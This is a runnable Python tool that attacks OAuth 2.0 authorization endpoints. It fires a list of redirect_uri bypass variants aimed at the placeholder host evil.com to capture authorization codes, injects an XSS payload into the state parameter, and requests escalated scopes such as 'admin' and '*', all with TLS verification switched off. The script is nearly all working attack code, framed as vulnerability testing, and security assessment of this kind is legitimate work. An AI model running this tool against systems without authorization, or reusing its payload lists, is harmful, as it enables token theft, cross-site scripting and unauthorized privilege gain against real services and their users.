#!/usr/bin/env python3
"""OAuth 2.0 vulnerability tester — redirect_uri bypass, state manipulation, scope escalation."""
import argparse
import requests
import json
import sys
import urllib.parse
import urllib3
urllib3.disable_warnings()

def test_redirect_uri(auth_url, client_id, redirect_uri):
    """Test redirect_uri manipulation for open redirect → token theft."""
    variants = [
        redirect_uri,
        redirect_uri + ".evil.com",
        redirect_uri + "@evil.com",
        redirect_uri + "%40evil.com",
        redirect_uri + "/../../../evil.com",
        "https://evil.com?" + redirect_uri,
        "https://evil.com#" + redirect_uri,
        "https://evil.com/." + urllib.parse.urlparse(redirect_uri).hostname,
        redirect_uri.replace("https://", "http://"),
        redirect_uri + "///evil.com",
        redirect_uri.rstrip("/") + ".evil.com/callback",
        "https://" + urllib.parse.urlparse(redirect_uri).hostname + ".evil.com",
        redirect_uri + "%23@evil.com",
        redirect_uri + "?next=https://evil.com",
        redirect_uri + "/../../evil.com",
    ]
    results = []
    for uri in variants:
        try:
            params = {"response_type": "code", "client_id": client_id, "redirect_uri": uri, "scope": "openid"}
            resp = requests.get(auth_url, params=params, allow_redirects=False, verify=False, timeout=10)
            accepted = resp.status_code in [302, 303, 307] and uri in resp.headers.get("Location", "")
            error_page = resp.status_code == 200 and "error" not in resp.text.lower()
            result = {"redirect_uri": uri, "status": resp.status_code, "accepted": accepted or error_page,
                      "location": resp.headers.get("Location", "")[:200]}
            results.append(result)
            icon = "[VULN!]" if result["accepted"] else "[SAFE] "
            print(f"  {icon} {uri[:80]}")
            if result["accepted"]:
                print(f"         → Location: {result['location'][:100]}")
        except Exception as e:
            results.append({"redirect_uri": uri, "error": str(e)})
    return results

def test_state_param(auth_url, client_id, redirect_uri):
    """Test state parameter handling — reuse, empty, missing."""
    tests = [
        ("missing", {}),
        ("empty", {"state": ""}),
        ("fixed_value", {"state": "aaa"}),
        ("reuse_old", {"state": "previously_used_state_12345"}),
        ("xss_payload", {"state": "<script>alert(1)</script>"}),
    ]
    results = []
    for name, extra_params in tests:
        try:
            params = {"response_type": "code", "client_id": client_id, "redirect_uri": redirect_uri, "scope": "openid", **extra_params}
            resp = requests.get(auth_url, params=params, allow_redirects=False, verify=False, timeout=10)
            accepted = resp.status_code in [302, 303, 307, 200]
            result = {"test": name, "status": resp.status_code, "accepted": accepted}
            results.append(result)
            icon = "[WARN]" if accepted and name != "fixed_value" else "[OK]  "
            print(f"  {icon} state={name} → {resp.status_code}")
        except Exception as e:
            results.append({"test": name, "error": str(e)})
    return results

def test_scope_escalation(auth_url, client_id, redirect_uri):
    """Test scope escalation — request more permissions than allowed."""
    scopes = [
        "openid", "openid profile", "openid profile email",
        "admin", "read write delete", "openid admin",
        "openid offline_access", "*", "openid user:admin",
        "openid profile email phone address",
    ]
    results = []
    for scope in scopes:
        try:
            params = {"response_type": "code", "client_id": client_id, "redirect_uri": redirect_uri, "scope": scope}
            resp = requests.get(auth_url, params=params, allow_redirects=False, verify=False, timeout=10)
            accepted = resp.status_code in [302, 303, 307, 200] and "error" not in resp.text.lower()[:500]
            result = {"scope": scope, "status": resp.status_code, "accepted": accepted}
            results.append(result)
            icon = "[VULN!]" if accepted and scope in ["admin", "*", "read write delete"] else "[OK]  "
            print(f"  {icon} scope={scope} → {resp.status_code}")
        except Exception as e:
            results.append({"scope": scope, "error": str(e)})
    return results

def main():
    parser = argparse.ArgumentParser(description="OAuth 2.0 vulnerability tester")
    parser.add_argument("auth_url", help="Authorization endpoint URL")
    parser.add_argument("--client-id", required=True, help="OAuth client_id")
    parser.add_argument("--redirect-uri", required=True, help="Legitimate redirect_uri")
    parser.add_argument("--json-output", action="store_true")
    args = parser.parse_args()

    all_results = {}
    print(f"\nOAuth Vulnerability Test: {args.auth_url}")
    print(f"{'='*60}\n")

    print("[1] Redirect URI Bypass Tests:")
    all_results["redirect_uri"] = test_redirect_uri(args.auth_url, args.client_id, args.redirect_uri)

    print(f"\n[2] State Parameter Tests:")
    all_results["state"] = test_state_param(args.auth_url, args.client_id, args.redirect_uri)

    print(f"\n[3] Scope Escalation Tests:")
    all_results["scope"] = test_scope_escalation(args.auth_url, args.client_id, args.redirect_uri)

    if args.json_output:
        print(json.dumps(all_results, indent=2))

if __name__ == "__main__":
    main()
